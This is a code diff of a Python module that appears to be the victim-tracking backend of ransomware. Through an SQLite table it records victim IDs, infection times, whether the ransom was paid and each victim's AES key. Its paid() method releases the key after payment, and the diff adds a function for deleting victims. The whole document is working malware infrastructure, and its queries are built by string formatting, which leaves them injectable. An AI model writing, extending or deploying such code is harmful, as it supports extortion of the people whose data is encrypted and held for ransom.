@@ -16,9 +16,9 @@ class victims:
                          ID         VARCHAR(32)    NOT NULL,
                          INFTIME    VARCHAR(100)    NOT NULL,
                          RANSOM     BOOLEAN         NOT NULL,
-                         PRIKEY     VARCHAR(100)    NOT NULL)""")
+                         AESKEY     VARCHAR(100)    NOT NULL)""")
         db.commit()
-        cursor.execute("""INSERT INTO victims (ID, INFTIME, RANSOM, PRIKEY) 
+        cursor.execute("""INSERT INTO victims (ID, INFTIME, RANSOM, AESKEY) 
                                 VALUES ('{i}', '{t}', FALSE, '123')""".format(
                                     i=uuid.uuid1().hex,t=time.ctime()))
         db.commit()
@@ -29,15 +29,15 @@ class victims:
             self.create_sql()
         db = sqlite3.connect(self.dbname)
         cursor = db.cursor()
-        r = cursor.execute("""SELECT ID, INFTIME, RANSOM FROM victims""")
+        r = cursor.execute("""SELECT * FROM victims""")
         result = r.fetchall()
         for i in result:
             self.vicList.append({
-                'vid': i[0], 
-                'inftime': i[1], 
-                'ransom': bool(i[2])}
-            )
-        print(self.vicList[0]['vid'])
+                'id': i[0], 
+                'inf_time': i[1], 
+                'ransom': bool(i[2]),
+                'AES_key': i[3]})
+        print(self.vicList[0]['id'])
         db.close()
 
     def new_victim(self, vid, pkey):
@@ -50,7 +50,7 @@ class victims:
         '''
         db = sqlite3.connect(self.dbname)
         cursor = db.cursor()
-        cursor.execute("""INSERT INTO victims (ID, INFTIME, RANSOM, PRIKEY) 
+        cursor.execute("""INSERT INTO victims (ID, INFTIME, RANSOM, AESKEY) 
                                 VALUES ('{i}', '{t}', FALSE, '{k}')""".format(
                                     i=vid, t=time.ctime(), k=pkey))
         db.commit()
@@ -64,20 +64,33 @@ class victims:
             paidid: id of victim who paid ransom
         '''
         for index,i in enumerate(self.vicList):
-            if paidid == i['vid']:
+            if paidid == i['id']:
                 self.vicList[index]['ransom'] = True
                 db = sqlite3.connect(self.dbname)
                 cursor = db.cursor()
                 cursor.execute("""UPDATE victims SET RANSOM=TRUE WHERE ID='{i}'""".format(i=paidid))
                 db.commit()
-                r = cursor.execute("""SELECT PRIKEY FROM victims WHERE ID='{i}'""".format(i=paidid))
+                r = cursor.execute("""SELECT AESKEY FROM victims WHERE ID='{i}'""".format(i=paidid))
                 result = r.fetchone()
                 db.close()
-                print(result[0])
+                # print(result[0])
                 # print(index, self.vicList[index])
                 return result[0]
     
+    def rm_victim(self, vid):
+        for index,i in enumerate(self.vicList):
+            if vid == i['id']:
+                self.vicList.remove(self.vicList[index]) 
+                db = sqlite3.connect(self.dbname)
+                cursor = db.cursor()
+                cursor.execute("""DELETE FROM victims WHERE ID='{i}'""".format(i=vid))
+                db.commit()
+                db.close()
+                return True
+        return False
+
 if __name__ == "__main__":
     # a = victims()
     # a.paid('adec76887e2f11ea865e6014b36bdca6')
     # a.new_victim(uuid.uuid1().hex, '456')
+    pass
